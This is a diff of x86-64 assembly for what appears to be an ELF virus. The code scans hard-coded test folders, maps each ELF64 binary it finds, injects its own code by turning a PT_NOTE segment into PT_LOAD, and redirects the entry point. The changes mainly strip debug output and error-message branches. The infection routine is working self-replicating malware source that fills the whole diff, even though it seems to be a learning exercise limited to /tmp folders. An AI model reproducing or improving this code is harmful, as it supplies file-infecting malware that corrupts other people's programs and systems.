@@ -162,7 +162,7 @@ treate_folder:
 	xor rdx, rdx					; 0
 	syscall						; );
 	cmp rax, 0					; if (_ret < 0)
-	jl .err						;	 goto .err
+	jl .end						; 	goto .end
 	mov [fd], rax					; fd = _ret;
 
 .begin_getdents_loop:					; while (true) {
@@ -183,12 +183,6 @@ treate_folder:
 	lea rax, [buf]					; cur_dirent = buf + cur_offset;
 	add rax, [cur_offset]				; ...
 	mov [cur_dirent], rax				; ...
-
-	; start debug (delete this)
-	mov rdi, [cur_dirent]				; char *_str = cur_dirent->d_name;
-	add rdi, linux_dirent64.d_name			; ...
-	call print_string				; print_string(_str);
-	; end debug
 
 	mov rdi, [folder]				; treat_file(folder;
 	mov rsi, [cur_dirent]				; 	cur_dirent
@@ -214,18 +208,6 @@ treate_folder:
 	mov rax, SYS_CLOSE				; _ret = close(
 	mov rdi, [fd]					;	fd
 	syscall						; );
-	cmp rax, -1					; if (_ret == -1)
-	je .err						; 	goto .err
-	jmp .end					; else goto end
-
-; TODO Delete this
-.err:
-	mov rax, SYS_WRITE				; write(
-	mov rdi, 1					; 	1,
-	lea rsi, [rel err_msg]				; 	err_msg,
-	mov rdx, len_err_msg				; 	len_err_msg,
-	syscall						; );
-	jmp .end					; goto .end
 
 .end:
 	add rsp, %$localsize
@@ -267,10 +249,10 @@ treat_file:
 	xor r8, r8					; len = 0;
 	lea rdi, [pathbuf]				; dest = pathbuf;
 	mov rsi, [dirname]				; src = dirname;
-	.dirname: ; TODO : Do something with repnz instead of these 3 lines?
+	.dirname:
 		inc r8					; len++;
 		cmp r8, PATH_MAX			; if (len == PATH_MAX)
-		je .err					; 	goto .err;
+		je .end					; 	goto .end;
 		movsb					; *dest++ = *src++;
 		cmp byte [rsi], 0			; if (*src != 0)
 		jnz .dirname				; 	goto .dirname;
@@ -279,7 +261,7 @@ treat_file:
 	.filename:
 		inc r8					; len++;
 		cmp r8, PATH_MAX			; if (len == PATH_MAX)
-		je .err					; 	goto .err;
+		je .end					; 	goto .end;
 		movsb					; *dest++ = *src++;
 		cmp byte [rsi], 0			; if (*src != 0)
 		jnz .filename				; 	goto .filename;
@@ -294,7 +276,7 @@ treat_file:
 	xor rdx, rdx					; 0
 	syscall						; );
 	cmp rax, 0					; if (_ret < 0)
-	jl .err						;	 goto .err
+	jl .end						; 	goto .end
 	mov [fd], rax					; fd = _ret;
 
 	; Get file stat
@@ -303,13 +285,13 @@ treat_file:
 	mov rdi, [fd]					; 	fd,
 	syscall						; _stat);
 	cmp rax, -1					; if (_ret == -1)
-	je .close_err					; 	goto .close_err
+	je .close_file					; 	goto .close_file
 
 	add rsi, stat.st_size				; filesize = _stat->st_size;
 	mov rax, [rsi]					; ...
 	mov [filesize], rax				; ...
 	cmp rax, MINIMAL_FILE_SIZE			; if (filesize < MINIMAL_FILE_SIZE)
-	jl .close_err					; 	goto .close_err
+	jl .close_file					; 	goto .close_file
 
 	; Reserve file size + payload size (for PT_NOTE method)
 	; TODO Check man 2 and 3P of mmap. Not sure if I can do this
@@ -324,7 +306,7 @@ treat_file:
 	xor r9, r9					; 	0
 	syscall						; );
 	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
-	je .close_err					; 	goto .close_err
+	je .close_file					; 	goto .close_file
 	mov [mappedfile], rax				; mappedfile = _ret;
 
 	; Map file
@@ -337,14 +319,14 @@ treat_file:
 	xor r9, r9					; 	0
 	syscall						; );
 	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
-	je .close_err					; 	goto .close_err
+	je .close_file					; 	goto .close_file
 	mov [mappedfile], rax				; mappedfile = _ret;
 
 	; Check if file is an ELF 64
 	mov rdi, [mappedfile]				; is_elf_64(mappedfile);
 	call is_elf_64					; ...
 	cmp rax, 1					; if (is_elf_64(mappedfile) != 1)
-	jne .unmap_err					; 	goto .unmap_err
+	jne .unmap_file					; 	goto .unmap_file
 
 	; TODO: Check if file has signature
 	
@@ -379,8 +361,7 @@ treat_file:
 	add rsi, [payload_size]				; + payload_size
 	syscall						; );
 	cmp rax, 0					; if (_ret < 0)
-	; TODO Replace with an other name ? It is not an unamp err but we will do the same things
-	jl .unmap_err					;	goto .unmap_err
+	jl .unmap_file					; 	goto .unmap_file
 
 	; Get address of the start of the current page
 	; TODO Do something about old_filesize but we use [filesize]
@@ -403,8 +384,8 @@ treat_file:
 	mov r8, [fd]					; 	fd,
 	mov r9, [offset_to_sub_mmap]			;	offset_to_sub_mmap
 	syscall						; );
-
-	; TODO Check mmap
+	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
+	je .unmap_file					; 	goto .unmap_file
 
 	; copy all bytes between _start and _end to the segment
 	mov rdi, [mappedfile]				; dest = file_map + filesize;
@@ -437,49 +418,18 @@ treat_file:
 	add rdi, elf64_hdr.e_entry			; ...
 	mov rax, [new_vaddr]				; *_e_entry = new_vaddr;
 	mov [rdi], rax					; ...
-
 	
 	; TODO: sign
-
-	jmp .unmap_file
-
-; TODO Delete this
-.unmap_err:
-	mov rax, SYS_WRITE				; write(
-	mov rdi, 1					; 	1,
-	lea rsi, [rel err_msg]				; 	err_msg,
-	mov rdx, len_err_msg				; 	len_err_msg,
-	syscall						; );
-	jmp .unmap_file
 
 .unmap_file:
 	mov rax, SYS_MUNMAP				; _ret = munmap(
 	mov rdi, [mappedfile]				; 	mappedfile,
 	mov rsi, [filesize]				; 	filesize
 	syscall						; );
-	jmp .close_file					; goto .close_file
-
-; TODO Delete this
-.close_err:
-	mov rax, SYS_WRITE				; write(
-	mov rdi, 1					; 	1,
-	lea rsi, [rel err_msg]				; 	err_msg,
-	mov rdx, len_err_msg				; 	len_err_msg,
-	syscall						; );
-	jmp .close_file
 
 .close_file:
 	mov rax, SYS_CLOSE				; _ret = close(
 	mov rdi, [fd]					;	fd
-	syscall						; );
-	jmp .end					; goto end
-
-; TODO Delete this
-.err:
-	mov rax, SYS_WRITE				; write(
-	mov rdi, 1					; 	1,
-	lea rsi, [rel err_msg]				; 	err_msg,
-	mov rdx, len_err_msg				; 	len_err_msg,
 	syscall						; );
 
 .end:
@@ -816,39 +766,6 @@ convert_pt_note_to_load:
 	pop rbp
 	%pop
 	ret						; return _ret;
-
-; DEBUG
-; void print_string(char const *str);
-; void print_string(rdi str);
-print_string:
-	push rdi					; save str				
-
-	xor rdx, rdx					; _len = 0;
-	.begin_strlen_loop:				; while (true) {
-		mov sil, [rdi]				; _c = *_str;
-		cmp sil, 0				; if (_c == 0)
-		je .end_strlen_loop			; 	break;
-		inc rdx					; _len++
-		inc rdi					; _str++;
-		jmp .begin_strlen_loop			; }
-	.end_strlen_loop:				; ...
-
-	pop rsi						; load str
-
-	mov rax, SYS_WRITE				; write(
-	mov rdi, 1					; 	1,
-	syscall						;	str, _len);
-
-	mov rax, SYS_WRITE				; write(
-	mov rdi, 1					; 	1, 
-	push 0x0A					; 	'\n',
-	mov rsi, rsp					; 	...
-	mov rdx, 1					; 	1
-	syscall						; );
-	add rsp, 8					; unpop '\n'
-	
-	ret
-
 section .data
 	infected_folder_1: db "/tmp/test/", 0
 	infected_folder_2: db "/tmp/test2/", 0
